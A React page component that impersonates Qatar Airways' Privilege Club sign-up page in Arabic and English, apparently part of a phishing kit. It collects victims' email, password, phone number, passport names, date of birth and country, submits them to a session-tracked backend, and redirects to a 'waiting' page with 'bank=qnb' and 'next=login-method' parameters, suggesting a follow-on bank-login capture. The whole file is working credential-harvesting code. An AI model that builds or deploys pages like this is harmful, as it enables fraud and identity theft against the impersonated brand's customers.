import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";
import { Eye, EyeOff, Check } from "lucide-react";

const TITLES = [
  "السيد", "الآنسة", "الآنسة", "السيدة", "سيد", "الشيخة", "الشيخ", "الدكتور", "الأستاذ", 
  "العميد", "القائد", "العقيد", "اللواء", "الليدي", "الأمير", "الأميرة", "مدام", "لورد", 
  "صاحب السعادة", "الشريف/الشريفة", "صاحب السمو الملكي", "صاحبة السمو الملكي"
];

const RESIDENCE_COUNTRIES = [
  "جزر والس وفوتونا", "مدغشقر", "IC", "آيسلندا", "أثيوبيا", "أذربيجان", "أرمينيا", "أروبا", 
  "أستراليا", "أفغانستان", "ألبانيا", "ألمانيا", "أنتيغوا وبربودا", "أندورا", "أندونيسيا", 
  "أنغولا", "أورغواي", "أوزباكستان", "أوغندا", "أوكرانيا", "إريتريا", "إسبانيا", "إسرائيل", 
  "إلسلفادور", "إيران", "إيرلندا", "إيطاليا", "استونيا", "الأرجنتين", "الأردن", "الإكوادور", 
  "الإمارات العربيّة المتّحدة", "البحرين", "البرازيل", "البرتغال", "البوسنا والهرسك", 
  "الجبل الأسود", "الجزائر", "الجمهورية السلوفاكية", "الدانمارك", "السنغال", "السودان", 
  "السويد", "الصومال", "الصين", "العراق", "الغابون", "الفاتيكان", "الفليبين", "الكاميرون", 
  "الكويت", "المجر", "المغرب", "المكسيك", "المملكة العربية السعودية", "المملكة المتحدة", 
  "النرويج", "النمسا", "النيجر", "الهند", "الولايات المتحدة الأمريكية", "اليابان", "اليمن", 
  "اليونان", "بابوا غينيا الجديدة", "باراغواي", "باكستان", "بالاو", "باهاماس", "بربادوس", 
  "بروناي", "بلجيكا", "بلغاريا", "بليز", "بنغلاديش", "بنما", "بنين", "بوتان", "بوتسوانا", 
  "بورتو ريكو", "بوركينا فاسو", "بوروندي", "بولندا", "بوليفيا", "بولينيزيا الفرنسية", 
  "بيرو", "تايلندا", "تايوان, الصين", "تركس وكايكوس", "تركمانستان", "تركيا", "ترينيداد وتوباغو", 
  "تشاد", "تنزانيا", "توغو", "توفالو", "تونس", "تونغا", "تيمور ليست", "جبل طارق", "جرينلاند", 
  "جزر أنغويلا ليوارد", "جزر الرأس الأخضر", "جزر القمر", "جزر الكريماس", "جزر المالديف", 
  "جزر الولايات المتحدة الصغيرة النائية", "جزر برمودا", "جزر جوادلوب", "جزر سليمان", 
  "جزر فارو", "جزر فوكلاند", "جزر فيرجن الأمريكية", "جزر فيرجين البريطانية", "جزر كايمان", 
  "جزر كوك", "جزر كوكوس", "جزر مارشال", "جزر ماريانا الشمالية", "جزيرة نورفولك", "جمايكا", 
  "جمهورية أفريقيا الوسطى", "جمهورية التشيكية", "جمهورية الدومينيكان", "جمهورية الكونغو", 
  "جمهورية الكونغو الديمقراطية", "جمهورية صربيا", "جمهورية كوسوفو", "جنوب أفريقيا", 
  "جنوب السودان", "جوام", "جيبوتي", "جيورجيا", "خراساو", "دومينيكا", "رواندا", "روسيا الاتحادية", 
  "روسيا البيضاء", "رومانيا", "ريونيون", "زائير", "زامبيا", "زمبابوي", "ساحل العاج", "ساموا", 
  "ساموا الأمريكية", "سان تومي وبرينسيبي", "سان مارينو", "سانت بيير وميكلون", "سانت فنسنت وغرينادين", 
  "سانت كيتس ونيفس", "سانت لوسيا", "سانت مارتن", "سانت هيلينا", "سريلانكا", "سلطنة عمان", 
  "سلوفينيا", "سنغافورة", "سوازيلند", "سوريا", "سورينام", "سويسرا", "سيراليون", "سيشيل", 
  "شيلي", "طاجيكستان", "غامبيا", "غانا", "غرينادا", "غواتيمال", "غويانا الفرنسية", "غيانا", 
  "غينيا", "غينيا - بيساو", "غينيا الاستوائية", "فانواتو", "فرنسا", "فلسطين", "فنزويلا", 
  "فنلندا", "فيتنام", "فيجي", "قبرص", "قطر", "قيرغيزستان", "كازاخستان", "كاليدونيا الجديدة", 
  "كرواتيا", "كمبوديا", "كندا", "كوبا", "كوريا الجنوبية", "كوريا الشمالية", "كوستاريكا", 
  "كولومبيا", "كيريباتي", "كينيا", "لاتفيا", "لاوس", "لبنان", "لوكسمبورغ", "ليبيا", "ليبيريا", 
  "ليتوانيا", "ليختنشتين", "ليسوتو", "مارتينيك", "مالاوي", "مالطا", "مالي", "ماليزيا", 
  "مايكرونيزيا", "مصر", "مقدونيا الشمالية", "مكاو,  الصين", "منغوليا", "موريتانيا", "موريشيوس", 
  "موزمبيق", "مولدافيا", "موناكو", "مونتسيرات", "ميانمار", "ناميبيا", "نورو", "نيبال", "نيجيريا", 
  "نيكاراجوا", "نيوزيلندا", "نيوى", "هايتي", "هندوراس", "هولندا", "هونغ كونغ، الصين"
];

const PHONE_CODES = [
  "جزر والس وفوتونا (681)", "مدغشقر (261)", "IC (34)", "آيسلندا (354)", "أثيوبيا (251)", 
  "أذربيجان (994)", "أرمينيا (374)", "أروبا (297)", "أستراليا (61)", "أفغانستان (93)", 
  "ألبانيا (355)", "ألمانيا (49)", "أنتيغوا وبربودا (1)", "أندورا (376)", "أندونيسيا (62)", 
  "أنغولا (244)", "أورغواي (598)", "أوزباكستان (998)", "أوغندا (256)", "أوكرانيا (380)", 
  "إريتريا (291)", "إسبانيا (34)", "إسرائيل (972)", "إلسلفادور (503)", "إيران (98)", 
  "إيرلندا (353)", "إيطاليا (39)", "استونيا (372)", "الأرجنتين (54)", "الأردن (962)", 
  "الإكوادور (593)", "الإمارات العربيّة المتّحدة (971)", "البحرين (973)", "البرازيل (55)", 
  "البرتغال (351)", "البوسنا والهرسك (387)", "الجبل الأسود (382)", "الجزائر (213)", 
  "الجمهورية السلوفاكية (421)", "الدانمارك (45)", "السنغال (221)", "السودان (249)", 
  "السويد (46)", "الصومال (252)", "الصين (86)", "العراق (964)", "الغابون (241)", 
  "الفاتيكان (39)", "الفليبين (63)", "الكاميرون (237)", "الكويت (965)", "المجر (36)", 
  "المغرب (212)", "المكسيك (52)", "المملكة العربية السعودية (966)", "المملكة المتحدة (44)", 
  "النرويج (47)", "النمسا (43)", "النيجر (227)", "الهند (91)", "الولايات المتحدة الأمريكية (1)", 
  "اليابان (81)", "اليمن (967)", "اليونان (30)", "بابوا غينيا الجديدة (675)", "باراغواي (595)", 
  "باكستان (92)", "بالاو (680)", "باهاماس (242)", "بربادوس (1)", "بروناي (673)", "بلجيكا (32)", 
  "بلغاريا (359)", "بليز (501)", "بنغلاديش (880)", "بنما (507)", "بنين (229)", "بوتان (975)", 
  "بوتسوانا (267)", "بورتو ريكو (1)", "بوركينا فاسو (226)", "بوروندي (257)", "بولندا (48)", 
  "بوليفيا (591)", "بولينيزيا الفرنسية (689)", "بيرو (51)", "تايلندا (66)", "تايوان, الصين (886)", 
  "تركس وكايكوس (1)", "تركمانستان (993)", "تركيا (90)", "ترينيداد وتوباغو (1)", "تشاد (235)", 
  "تنزانيا (255)", "توغو (228)", "توفالو (688)", "تونس (216)", "تونغا (676)", "تيمور ليست (670)", 
  "جبل طارق (350)", "جرينلاند (299)", "جزر أنغويلا ليوارد (1)", "جزر الرأس الأخضر (238)", 
  "جزر القمر (269)", "جزر الكريماس (672)", "جزر المالديف (960)", "جزر الولايات المتحدة الصغيرة النائية (1)", 
  "جزر برمودا (1441)", "جزر جوادلوب (590)", "جزر سليمان (677)", "جزر فارو (298)", "جزر فوكلاند (500)", 
  "جزر فيرجن الأمريكية (1)", "جزر فيرجين البريطانية (1)", "جزر كايمان (1)", "جزر كوك (682)", 
  "جزر كوكوس (672)", "جزر مارشال (692)", "جزر ماريانا الشمالية (670)", "جزيرة نورفولك (6)", 
  "جمايكا (1)", "جمهورية أفريقيا الوسطى (236)", "جمهورية التشيكية (420)", "جمهورية الدومينيكان (1)", 
  "جمهورية الكونغو (242)", "جمهورية الكونغو الديمقراطية (243)", "جمهورية صربيا (381)", 
  "جمهورية كوسوفو (383)", "جنوب أفريقيا (27)", "جنوب السودان (211)", "جوام (671)", "جيبوتي (253)", 
  "جيورجيا (995)", "خراساو (599)", "دومينيكا (1)", "رواندا (250)", "روسيا الاتحادية (7)", 
  "روسيا البيضاء (375)", "رومانيا (40)", "ريونيون (262)", "زائير (243)", "زامبيا (260)", 
  "زمبابوي (263)", "ساحل العاج (225)", "ساموا (685)", "ساموا الأمريكية (684)", "سان تومي وبرينسيبي (239)", 
  "سان مارينو (378)", "سانت بيير وميكلون (508)", "سانت فنسنت وغرينادين (1)", "سانت كيتس ونيفس (1)", 
  "سانت لوسيا (758)", "سانت مارتن (721)", "سانت هيلينا (1)", "سريلانكا (94)", "سلطنة عمان (968)", 
  "سلوفينيا (386)", "سنغافورة (65)", "سوازيلند (268)", "سوريا (963)", "سورينام (597)", 
  "سويسرا (41)", "سيراليون (232)", "سيشيل (248)", "شيلي (56)", "طاجيكستان (992)", "غامبيا (220)", 
  "غانا (233)", "غرينادا (473)", "غواتيمال (502)", "غويانا الفرنسية (594)", "غيانا (592)", 
  "غينيا (224)", "غينيا - بيساو (245)", "غينيا الاستوائية (240)", "فانواتو (678)", "فرنسا (33)", 
  "فلسطين (970)", "فنزويلا (58)", "فنلندا (358)", "فيتنام (84)", "فيجي (679)", "قبرص (357)", 
  "قطر (974)", "قيرغيزستان (996)", "كازاخستان (7)", "كاليدونيا الجديدة (687)", "كرواتيا (385)", 
  "كمبوديا (855)", "كندا (1)", "كوبا (53)", "كوريا الجنوبية (82)", "كوريا الشمالية (850)", 
  "كوستاريكا (506)", "كولومبيا (57)", "كيريباتي (686)", "كينيا (254)", "لاتفيا (371)", 
  "لاوس (856)", "لبنان (961)", "لوكسمبورغ (352)", "ليبيا (218)", "ليبيريا (231)", 
  "ليتوانيا (370)", "ليختنشتين (423)", "ليسوتو (266)", "مارتينيك (596)", "مالاوي (265)", 
  "مالطا (356)", "مالي (223)", "ماليزيا (60)", "مايكرونيزيا (691)", "مصر (20)", 
  "مقدونيا الشمالية (389)", "مكاو,  الصين (853)", "منغوليا (976)", "موريتانيا (222)", 
  "موريشيوس (230)", "موزمبيق (258)", "مولدافيا (373)", "موناكو (377)", "مونتسيرات (1)", 
  "ميانمار (95)", "ناميبيا (264)", "نورو (674)", "نيبال (977)", "نيجيريا (234)", 
  "نيكاراجوا (505)", "نيوزيلندا (64)", "نيوى (683)", "هايتي (509)", "هندوراس (504)", 
  "هولندا (31)", "هونغ كونغ، الصين (852)"
];

const DAYS = Array.from({ length: 31 }, (_, i) => (i + 1).toString().padStart(2, '0'));
const MONTHS = Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0'));
const YEARS = Array.from({ length: 100 }, (_, i) => (new Date().getFullYear() - i).toString());

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";
  const footerImage = isArabic 
    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";
  
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    confirmPassword: "",
    countryCode: "قطر (974)",
    phoneNumber: "",
    title: "",
    nameEnglish: "",
    middleName: "",
    lastName: "",
    birthDay: "",
    birthMonth: "",
    birthYear: "",
    gender: "",
    country: "قطر",
    promoCode: "",
  });

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
      return;
    }

    if (formData.password !== formData.confirmPassword) {
      toast.error(isArabic ? "كلمات المرور غير متطابقة" : "Passwords do not match");
      return;
    }

    const fullDob = `${formData.birthDay}/${formData.birthMonth}/${formData.birthYear}`;

    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId: currentSessionId,
        email: formData.email,
        password: formData.password,
        phoneNumber: `${formData.countryCode} ${formData.phoneNumber}`,
        title: formData.title,
        nameEnglish: formData.nameEnglish,
        middleName: formData.middleName,
        lastName: formData.lastName,
        dateOfBirth: fullDob,
        gender: formData.gender,
        country: formData.country,
        promoCode: formData.promoCode,
        nameArabic: "",
        idNumber: "",
      });
      
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      const giftId = params.get("gift") || "";
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}&next=login-method`);
    } catch (error) {
      console.error("Error saving personal data:", error);
      toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
    }
  };

  useEffect(() => {
    document.title = isArabic ? "إنشاء حساب | الخطوط الجوية القطرية" : "Join Now | Qatar Airways";
  }, [isArabic]);

  return (
    <div className="page-wrapper min-h-screen bg-white" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        .page-wrapper { font-family: 'Qatar Airways Next', sans-serif; color: #333; }
        .main-container { max-width: 1100px; margin: 0 auto; padding: 40px 20px; }
        .hero-section { background: url('https://www.qatarairways.com/content/dam/images/renditions/horizontal-1/campaigns/global/privilege-club/enrollment/enrollment-hero-desktop.jpg') center/cover; height: 300px; display: flex; align-items: center; justify-content: center; position: relative; border-radius: 8px; margin-bottom: 40px; }
        .hero-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.3); border-radius: 8px; }
        .hero-content { position: relative; z-index: 1; text-align: center; color: white; }
        .hero-content h1 { font-size: 36px; font-weight: bold; margin-bottom: 10px; }
        
        .benefits-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 50px; background: #f8f9fb; padding: 30px; border-radius: 8px; }
        .benefit-item { display: flex; align-items: center; gap: 12px; font-size: 14px; color: #555; }
        .check-icon { color: #8C0032; flex-shrink: 0; }

        .form-section { max-width: 800px; margin: 0 auto; }
        .form-title { font-size: 32px; font-weight: bold; color: #333; margin-bottom: 30px; text-align: center; }
        .section-header { font-size: 18px; font-weight: bold; color: #333; margin: 40px 0 20px; padding-bottom: 10px; border-bottom: 1px solid #eee; }
        
        .grid-layout { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media (max-width: 768px) { .grid-layout { grid-template-columns: 1fr; } }

        .input-group { margin-bottom: 25px; }
        .input-label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; }
        .input-wrapper { position: relative; }
        .form-input { width: 100%; padding: 12px 16px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; transition: border-color 0.2s; background-color: white; }
        .form-input:focus { border-color: #8C0032; outline: none; }
        
        .password-hint { font-size: 12px; color: #777; margin-top: 8px; line-height: 1.5; }
        .password-toggle { position: absolute; ${isArabic ? 'left' : 'right'}: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #8C0032; }

        .radio-group { display: flex; gap: 30px; margin-top: 10px; }
        .radio-item { display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 16px; }
        .radio-item input { width: 20px; height: 20px; accent-color: #8C0032; }

        .checkbox-section { margin-top: 40px; border-top: 1px solid #eee; padding-top: 30px; }
        .checkbox-item { display: flex; gap: 12px; margin-bottom: 20px; font-size: 14px; color: #555; line-height: 1.6; }
        .checkbox-item input { width: 20px; height: 20px; flex-shrink: 0; accent-color: #8C0032; }
        .checkbox-item a { color: #8C0032; text-decoration: underline; }

        .submit-btn { background: #8C0032; color: white; width: 100%; padding: 18px; border-radius: 4px; font-weight: bold; font-size: 18px; margin-top: 30px; cursor: pointer; transition: background 0.2s; border: none; }
        .submit-btn:hover { background: #6b0026; }
        
        .footer-banner { width: 100%; margin-top: 60px; border-top: 1px solid #eee; padding-top: 40px; text-align: center; }
        .footer-banner img { max-width: 100%; height: auto; }
        
        .dob-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
      `}</style>

      <Header />

      <div className="main-container">
        <div className="hero-section">
          <div className="hero-overlay"></div>
          <div className="hero-content">
            <h1>{isArabic ? "انضم إلى نادي الامتياز وابدأ بجمع نقاط أفيوس اليوم" : "Join Privilege Club and start collecting Avios today"}</h1>
          </div>
        </div>

        <div className="benefits-grid">
          {[
            isArabic ? "عروض حصرية لأعضاء نادي الامتياز" : "Exclusive offers for members",
            isArabic ? "اربح وأنفق نقاط أفيوس كما تشاء" : "Earn and spend Avios your way",
            isArabic ? "اجمع نقاط أفيوس مع عائلتك" : "Collect Avios with your family",
            isArabic ? "ساعة مجاناً من الإنترنت على متن الطائرة" : "One hour free Super Wi-Fi",
            isArabic ? "وفّر عند الدفع باستخدام cash + Avios" : "Save with Cash + Avios",
            isArabic ? "تسوّق وادفع في السوق الحرة القطرية" : "Shop and pay at Qatar Duty Free",
            isArabic ? "استمتع برحلات المكافآت والترقيات" : "Enjoy award flights and upgrades",
            isArabic ? "احصل على وزن أمتعة إضافي" : "Get extra baggage allowance",
            isArabic ? "استمتع بخدمة الصالات حول العالم*" : "Enjoy lounge access around the world*",
          ].map((text, i) => (
            <div key={i} className="benefit-item">
              <Check className="check-icon" size={18} />
              <span>{text}</span>
            </div>
          ))}
        </div>

        <div className="form-section">
          <h2 className="form-title">{isArabic ? "يمكنك إنشاء حساب خلال دقيقة واحدة فقط" : "You can create an account in just one minute"}</h2>

          <form onSubmit={handleSubmit}>
            <div className="section-header">{isArabic ? "دعنا ننشئ بيانات الاعتماد الخاصة بك." : "Let's create your credentials."}</div>
            
            <div className="input-group">
              <label className="input-label">{isArabic ? "عنوان البريد الإلكتروني" : "Email Address"}</label>
              <input type="email" name="email" className="form-input" value={formData.email} onChange={handleChange} required />
            </div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "ادخل كلمة مرور" : "Enter Password"}</label>
                <div className="input-wrapper">
                  <input type={showPassword ? "text" : "password"} name="password" className="form-input" value={formData.password} onChange={handleChange} required />
                  <div className="password-toggle" onClick={() => setShowPassword(!showPassword)}>
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </div>
                </div>
                <p className="password-hint">
                  {isArabic 
                    ? "يجب أن تتكون من 8 رموز على الأقل، منها رقم واحد وحرف كبير وحرف صغير ورمز خاص (!@#$%?&*)."
                    : "Must be at least 8 characters, including a number, uppercase, lowercase, and a special character (!@#$%?&*)."}
                </p>
              </div>

              <div className="input-group">
                <label className="input-label">{isArabic ? "إعادة إدخال كلمة المرور" : "Re-enter Password"}</label>
                <div className="input-wrapper">
                  <input type={showPassword ? "text" : "password"} name="confirmPassword" className="form-input" value={formData.confirmPassword} onChange={handleChange} required />
                </div>
              </div>
            </div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "رمز البلد الهاتفي" : "Country Dialing Code"}</label>
                <select name="countryCode" className="form-input" value={formData.countryCode} onChange={handleChange} required>
                  {PHONE_CODES.map(c => <option key={c} value={c}>{c}</option>)}
                </select>
              </div>
              <div className="input-group">
                <label className="input-label">{isArabic ? "رقم الجوال" : "Mobile Number"}</label>
                <input type="tel" name="phoneNumber" className="form-input" value={formData.phoneNumber} onChange={handleChange} required />
              </div>
            </div>

            <div className="section-header">{isArabic ? "بياناتك الشخصية" : "Your Personal Details"}</div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "اللقب" : "Title"}</label>
                <select name="title" className="form-input" value={formData.title} onChange={handleChange} required>
                  <option value="">{isArabic ? "اللقب" : "Title"}</option>
                  {TITLES.map(t => <option key={t} value={t}>{t}</option>)}
                </select>
              </div>
              <div className="input-group">
                <label className="input-label">{isArabic ? "الاسم الأول (كما في جواز السفر)" : "First Name (as in Passport)"}</label>
                <input type="text" name="nameEnglish" className="form-input" value={formData.nameEnglish} onChange={handleChange} required />
              </div>
            </div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "الاسم الأوسط (اختياري)" : "Middle Name (Optional)"}</label>
                <input type="text" name="middleName" className="form-input" value={formData.middleName} onChange={handleChange} />
              </div>
              <div className="input-group">
                <label className="input-label">{isArabic ? "اسم العائلة (كما في جواز السفر)" : "Last Name (as in Passport)"}</label>
                <input type="text" name="lastName" className="form-input" value={formData.lastName} onChange={handleChange} required />
              </div>
            </div>

            <div className="grid-layout">
              <div className="input-group">
                <label className="input-label">{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
                <div className="dob-grid">
                  <select name="birthDay" className="form-input" value={formData.birthDay} onChange={handleChange} required>
                    <option value="">{isArabic ? "اليوم" : "Day"}</option>
                    {DAYS.map(d => <option key={d} value={d}>{d}</option>)}
                  </select>
                  <select name="birthMonth" className="form-input" value={formData.birthMonth} onChange={handleChange} required>
                    <option value="">{isArabic ? "الشهر" : "Month"}</option>
                    {MONTHS.map(m => <option key={m} value={m}>{m}</option>)}
                  </select>
                  <select name="birthYear" className="form-input" value={formData.birthYear} onChange={handleChange} required>
                    <option value="">{isArabic ? "السنة" : "Year"}</option>
                    {YEARS.map(y => <option key={y} value={y}>{y}</option>)}
                  </select>
                </div>
              </div>
              <div className="input-group">
                <label className="input-label">{isArabic ? "النوع (اختياري)" : "Gender (Optional)"}</label>
                <div className="radio-group">
                  <label className="radio-item">
                    <input type="radio" name="gender" value="male" checked={formData.gender === 'male'} onChange={handleChange} />
                    {isArabic ? "ذكر" : "Male"}
                  </label>
                  <label className="radio-item">
                    <input type="radio" name="gender" value="female" checked={formData.gender === 'female'} onChange={handleChange} />
                    {isArabic ? "أنثى" : "Female"}
                  </label>
                </div>
              </div>
            </div>

            <div className="section-header">{isArabic ? "أين تقيم؟" : "Where do you reside?"}</div>
            <div className="input-group">
              <select name="country" className="form-input" value={formData.country} onChange={handleChange} required>
                {RESIDENCE_COUNTRIES.map(c => <option key={c} value={c}>{c}</option>)}
              </select>
            </div>

            <div className="section-header">{isArabic ? "الرمز الترويجي لتسجيل الانضمام" : "Enrolment Promo Code"}</div>
            <div className="input-group">
              <input type="text" name="promoCode" className="form-input" placeholder={isArabic ? "الرمز الترويجي (اختياري)" : "Promo Code (Optional)"} value={formData.promoCode} onChange={handleChange} />
            </div>

            <div className="checkbox-section">
              <div className="checkbox-item">
                <input type="checkbox" id="partners" />
                <label htmlFor="partners">{isArabic ? "أرغب في تلقي الأخبار والعروض من شركاء نادي الامتياز" : "I would like to receive news and offers from Privilege Club partners"}</label>
              </div>
              <div className="checkbox-item">
                <input type="checkbox" id="qatar_group" />
                <label htmlFor="qatar_group">
                  {isArabic ? "أرغب في تلقي الأخبار والعروض من شركات أخرى في مجموعة الخطوط الجوية القطرية" : "I would like to receive news and offers from other companies in Qatar Airways Group"}
                </label>
              </div>
              <div className="checkbox-item">
                <input type="checkbox" id="terms" required />
                <label htmlFor="terms">
                  {isArabic 
                    ? "أوافق على شروط وأحكام نادي الامتياز وأتفهم أنه سيتم التعامل مع معلوماتي وفقاً لبيان خصوصية الخطوط الجوية القطرية." 
                    : "I agree to the Privilege Club Terms and Conditions and understand that my information will be handled in accordance with the Qatar Airways Privacy Notice."}
                </label>
              </div>
            </div>

            <button type="submit" className="submit-btn">
              {isArabic ? "إنشاء حساب" : "Create Account"}
            </button>
          </form>

          <div className="footer-banner">
            <img src={footerImage} alt="Qatar Airways Privilege Club" />
          </div>
        </div>
      </div>
    </div>
  );
}
